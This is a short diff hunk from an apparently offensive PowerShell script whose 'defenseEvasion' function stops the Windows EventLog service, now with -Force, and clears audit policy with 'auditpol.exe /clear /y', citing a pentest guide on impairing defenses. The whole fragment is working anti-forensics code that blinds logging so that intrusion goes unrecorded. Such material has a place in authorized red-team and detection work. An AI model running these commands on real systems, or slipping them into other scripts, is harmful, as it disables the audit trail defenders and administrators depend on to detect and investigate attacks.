@@ -23,7 +23,7 @@ function defenseEvasion {
     log -Info "---------- DEFENSE EVASTION ----------"
 
     #Stop Windows Event logging and audit policy logging. Source https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/impair-defenses/disable-windows-event-logging
-    Stop-Service -Name EventLog
+    Stop-Service -Name EventLog -Force
     log -Info "Windows event logging disabled."
 
     auditpol.exe /clear /y
